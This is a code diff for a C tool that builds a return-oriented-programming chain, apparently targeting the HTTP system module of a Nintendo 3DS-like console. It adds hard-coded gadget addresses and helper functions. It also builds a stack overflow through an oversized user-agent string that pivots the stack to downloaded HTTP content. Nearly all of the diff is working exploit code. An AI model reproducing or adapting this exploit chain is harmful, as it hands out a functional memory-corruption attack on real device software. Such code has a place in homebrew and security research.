@@ -8,8 +8,6 @@
 
 FILE *fout = NULL;
 
-//50424f532d382e302f303030303030303030303030303030302d303030303030303030303030303030302f30302e302e302d3030582f30303030302f3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c0308343434343535353536363636373737375f1912000000000074b80308b8b8030800000000602a1400f073ffff
-
 char configxml_formatstr[] = {
 "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
 <config>\n\
@@ -28,6 +26,14 @@ char configxml_formatstr[] = {
 </config>\n\
 "};
 
+u32 ROP_POPR4R5R67PC = 0x0012195f;
+
+u32 ROP_STACKPIVOT = 0x00142a64;//Add sp with r3 then pop-pc. 
+
+u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
+
+u32 ropvaddr_end = 0;
+
 //From ctrtool.
 void putle32(u8* p, u32 n)
 {
@@ -37,14 +43,103 @@ void putle32(u8* p, u32 n)
 	p[3] = n>>24;
 }
 
-void buildrop_config(u32 *ropchain)
+void ropgen_addword(u32 **ropchain, u32 *ropvaddr, u32 value)
 {
-	u32 ropvaddr = 0x0803b7f8-0xa4;
+	u32 *ptr = *ropchain;
+
+	if(ropvaddr_end <= *ropvaddr)
+	{
+		printf("ROP-chain is too large.\n");
+		exit(9);
+	}
+
+	putle32((u8*)ptr, value);
+
+	(*ropchain)++;
+	(*ropvaddr)+=4;
 }
 
-void buildrop_http(u32 *ropchain)
+void ropgen_addwords(u32 **ropchain, u32 *ropvaddr, u32 *buf, u32 total_words)
 {
-	u32 ropvaddr = 0x08032c00;
+	u32 *ptr = *ropchain;
+	u32 pos;
+
+	if(ropvaddr_end <= *ropvaddr || (ropvaddr_end < ((*ropvaddr) + total_words*4)))
+	{
+		printf("ROP-chain is too large.\n");
+		exit(9);
+	}
+
+	if(buf)
+	{
+		for(pos=0; pos<total_words; pos++)putle32((u8*)&ptr[pos], buf[pos]);
+	}
+	else
+	{
+		memset(ptr, 0, total_words*4);
+	}
+
+	(*ropchain)+=total_words;
+	(*ropvaddr)+= total_words*4;
+}
+
+void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7)//Total size: 0x14-bytes.
+{
+	ropgen_addword(ropchain, ropvaddr, ROP_POPR4R5R67PC);
+	ropgen_addword(ropchain, ropvaddr, r4);
+	ropgen_addword(ropchain, ropvaddr, r5);
+	ropgen_addword(ropchain, ropvaddr, r6);
+	ropgen_addword(ropchain, ropvaddr, r7);
+}
+
+void ropgen_stackpivot(u32 **ropchain, u32 *ropvaddr, u32 addr)//Total size: 0x8-bytes.
+{
+	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.
+
+	ropgen_addword(ropchain, ropvaddr, ROP_STACKPIVOT_POPR3);
+	ropgen_addword(ropchain, ropvaddr, addr - (*ropvaddr + 4));
+}
+
+void buildrop_config(u32 *ropchain, u32 ropchain_maxsize)
+{
+	u32 ropvaddr = 0x0803b7f8-0xa4;
+	u32 ua[0x80>>2];
+
+	u32 stack_contentbufsize_ptr = 0x803b874;
+	u32 stack_recvdata_timeoutptr = 0x803b8b8;
+
+	ropvaddr_end = ropvaddr+ropchain_maxsize;
+
+	//This ropchain buffer starts with the user-agent. The UA has 0x80-bytes allocated on stack, with the saved registers immediately following that. The sysmodule v13314 function for this is LT_121350.
+
+	memset(ua, 0, sizeof(ua));
+	strncpy((char*)ua, "PBOS-8.0/0000000000000000-0000000000000000/00.0.0-00X/00000/0", sizeof(ua)-1);
+
+	ropgen_addwords(&ropchain, &ropvaddr, ua, 0x80>>2);
+
+	//r0-r3 are not popped from stack during return.
+	ropgen_addword(&ropchain, &ropvaddr, 0);//r0
+	ropgen_addword(&ropchain, &ropvaddr, 0);//r1
+	ropgen_addword(&ropchain, &ropvaddr, 0);//r2
+	ropgen_addword(&ropchain, &ropvaddr, contentdatabuf_addr);//r3, output content data addr for httpc_ReceiveDataTimeout.
+
+	ropgen_addword(&ropchain, &ropvaddr, 0x34343434);//r4
+	ropgen_addword(&ropchain, &ropvaddr, 0x35353535);//r5
+	ropgen_addword(&ropchain, &ropvaddr, 0x36363636);//r6
+	ropgen_addword(&ropchain, &ropvaddr, 0x37373737);//r7
+
+	//pc for the initial reg-pop is here. The data starting at r4 below is also used by the target function as insp0, which has to be valid otherwise it won't download the content properly/crash.
+
+	ropgen_popr4r5r6r7r8pc(&ropchain, &ropvaddr, 0x0, stack_contentbufsize_ptr, stack_recvdata_timeoutptr, 0x0);
+
+	ropgen_stackpivot(&ropchain, &ropvaddr, contentdatabuf_addr);//Stack-pivot to the http content data downloaded by the targeted function.
+}
+
+void buildrop_http(u32 *ropchain, u32 ropchain_maxsize)
+{
+	u32 ropvaddr = contentdatabuf_addr;
+
+	ropvaddr_end = ropvaddr+ropchain_maxsize;
 }
 
 int main(int argc, char **argv)
@@ -151,10 +246,10 @@ int main(int argc, char **argv)
 		return 5;
 	}
 
-	if(output_type==0)buildrop_config(ropchain);
-	if(output_type==1)buildrop_http(ropchain);
+	if(output_type==0)ropchain_maxsize = 0xbc;
 
-	putle32(ropchain8, 0x44444444);
+	if(output_type==0)buildrop_config(ropchain, ropchain_maxsize);
+	if(output_type==1)buildrop_http(ropchain, ropchain_maxsize);
 
 	if(output_type==0)
 	{
